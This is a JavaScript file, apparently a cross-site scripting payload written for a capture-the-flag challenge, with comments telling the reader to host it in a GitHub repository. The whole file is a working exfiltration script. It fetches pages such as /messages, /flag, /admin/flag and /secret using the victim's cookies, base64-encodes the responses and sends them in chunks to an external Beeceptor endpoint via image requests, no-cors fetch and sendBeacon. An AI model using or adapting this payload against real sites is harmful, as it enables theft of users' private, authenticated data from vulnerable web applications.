// ppp.js - robust OOB → beeceptor (labolabo.free.beeceptor.com)
// Paste this into your GitHub repo (t1114m3n/ppp.js) and commit to main.

(function(){
  const END = "https://labolabo.free.beeceptor.com"; // your Beeceptor base (no trailing slash)
  const CHUNK = 400;   // smaller chunk size to avoid truncation
  const SLEEP_MS = 500; // slow down to avoid 429s

  function b64(s){
    try { return btoa(unescape(encodeURIComponent(String(s)))); }
    catch(e){ return btoa(String(s)); }
  }
  function sleep(ms){ return new Promise(r=>setTimeout(r, ms)); }

  // make a fire-and-forget GET via Image (very reliable)
  function imgSend(path){
    try { (new Image()).src = END + path; } catch(e){}
  }
  // best-effort no-cors fetch (backup)
  function fetchNoCors(path){
    try { fetch(END + path, { mode: 'no-cors', keepalive: true }); } catch(e){}
  }
  // sendBeacon for small payloads (preferred)
  function beaconSend(path, blob){
    try {
      if (navigator.sendBeacon) { navigator.sendBeacon(END + path, blob); return true; }
    } catch(e){}
    return false;
  }

  async function exfilLarge(name, encoded){
    const parts = [];
    for (let i=0;i<encoded.length;i+=CHUNK) parts.push(encoded.slice(i, i+CHUNK));
    // header announcing number of chunks
    imgSend("/_h/" + encodeURIComponent(name) + "/" + parts.length);
    // send chunks
    for (let i=0;i<parts.length;i++){
      const p = "/" + encodeURIComponent(name) + "/" + i + "/" + encodeURIComponent(parts[i]);
      imgSend(p);
      fetchNoCors("/_f/" + encodeURIComponent(name) + "/" + i);
      await sleep(150); // small pause between chunk sends
    }
  }

  async function exfilSmall(name, encoded){
    const meta = { from: location.pathname + location.search, endpoint: name, when: Date.now() };
    const body = JSON.stringify({ meta: meta, body: encoded });
    const blob = new Blob([body], {type: 'application/json'});
    if (beaconSend("/recv", blob)) return;
    // fallback single GET (may be truncated if very large)
    imgSend("/" + encodeURIComponent(name) + "/0/" + encodeURIComponent(encoded));
    fetchNoCors("/" + encodeURIComponent(name) + "/0/" + encodeURIComponent(encoded));
  }

  async function doFetchAndExfil(path, name){
    try {
      const resp = await fetch(path, { method: "GET", credentials: "include" });
      let txt = "";
      try { txt = await resp.text(); } catch(e){ txt = ""; }
      const encoded = b64(txt || "");
      if (encoded.length <= CHUNK) await exfilSmall(name, encoded);
      else await exfilLarge(name, encoded);
    } catch (err) {
      const encoded = b64("[error] " + String(err));
      await exfilSmall(name, encoded);
    }
  }

  (async function main(){
    try {
      // OPTIONAL: trigger /visit first (uncomment if needed)
      // try { await fetch("/visit", { method: "POST", credentials: "include",
      //     headers: {"Content-Type":"application/x-www-form-urlencoded"}, body: "id=1" }); await sleep(300); } catch(e){}

      // --------------- primary probes (one run) ----------------
      // Keep these conservative; add or change endpoints as needed.
      await doFetchAndExfil("/messages?id=1", "messages?id=1");
      await sleep(SLEEP_MS);

      // Add specific suspicious IDs here (uncomment and adjust)
      // await doFetchAndExfil("/messages?id=9093", "messages?id=9093"); await sleep(SLEEP_MS);
      // await doFetchAndExfil("/messages?id=9094", "messages?id=9094"); await sleep(SLEEP_MS);

      // A few other quick checks
      await doFetchAndExfil("/messages", "messages");
      await sleep(SLEEP_MS);
      await doFetchAndExfil("/flag", "flag");
      await sleep(SLEEP_MS);
      await doFetchAndExfil("/admin/flag", "admin_flag");
      await sleep(SLEEP_MS);
      await doFetchAndExfil("/secret", "secret");
      await sleep(SLEEP_MS);

      // done
    } catch(e){
      try { imgSend("/_err/" + encodeURIComponent(b64(String(e)))); } catch(e2){}
    }
  })();
})();
